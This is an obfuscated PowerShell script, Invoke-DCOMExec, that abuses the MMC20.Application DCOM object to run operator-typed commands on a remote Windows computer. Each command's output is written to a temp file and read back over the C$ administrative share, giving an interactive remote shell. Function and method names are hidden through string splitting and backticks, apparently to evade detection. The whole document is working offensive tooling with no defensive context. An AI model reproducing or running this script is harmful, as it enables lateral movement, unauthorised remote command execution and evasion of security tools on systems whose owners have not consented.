${K`XT}= [Type]("{0}{1}"-F'tY','pe')  ;&("{1}{2}{0}"-f'-iTEm','s','ET')  ("{2}{3}{0}{1}"-f ':nR','S4t','VARiab','lE')  ([typE]("{3}{0}{2}{1}" -f 'Em.AcTIVaT','r','o','SYst') )  ; function iNVOkE-D`COM`E`xeC {


    [CmdletBinding()]
    Param (
        [Parameter(maNdAToRY = ${tR`UE}, PosiTION = 0, ValuEFrOmpIpeLINE = ${t`Rue}, VaLUeFROMPIPELINEBYProPERtYnAmE = ${T`RUE})]
        [String]
        ${CoMPUt`e`Rn`AmE}

    )
        ${c`om} =   ${k`Xt}::("{3}{2}{0}{1}"-f'P','rogID','rom','GetTypeF').Invoke(("{4}{3}{2}{1}{0}"-f'ation','lic','C20.App','M','M'),"$ComputerName")
        ${O`BJ} =   ( .("{0}{1}{2}" -f'varIa','B','lE') ("{0}{1}" -f 'NRS4','T')  )."V`ALUE"::("{2}{3}{1}{0}" -f 'stance','n','Cre','ateI').Invoke(${c`Om})


        ${C`OMMa`ND} = ""
        while(${cOM`m`AnD} -ne ("{0}{1}" -f'e','xit'))
        {
            ${CoM`m`And} = &("{0}{2}{1}"-f 'Re','t','ad-Hos') -Prompt ("{2}{1}{0}{3}"-f 'c','MExe','[DCO',']>')
            if (${cOmm`AND} =&('=') ("{1}{0}" -f 't','exi'))
            {
                Exit
            }
            ${O`BJ}."dOCuM`e`NT"."Ac`TI`VeviEw".("{1}{0}{4}{2}{5}{3}"-f'e','Ex','uteS','llCommand','c','he').Invoke("cmd",${Nu`LL},('/c'+' '+"$Command "+'> '+('C:eWqWind'+'ow'+'se'+'W'+'qTempeWqasdjgqwei.'+'tmp')."r`e`plACE"(([CHaR]101+[CHaR]87+[CHaR]113),'\')),"7")
            .("{1}{0}" -f'at','c') "\\$ComputerName\c$\Windows\Temp\asdjgqwei.tmp"

        }
}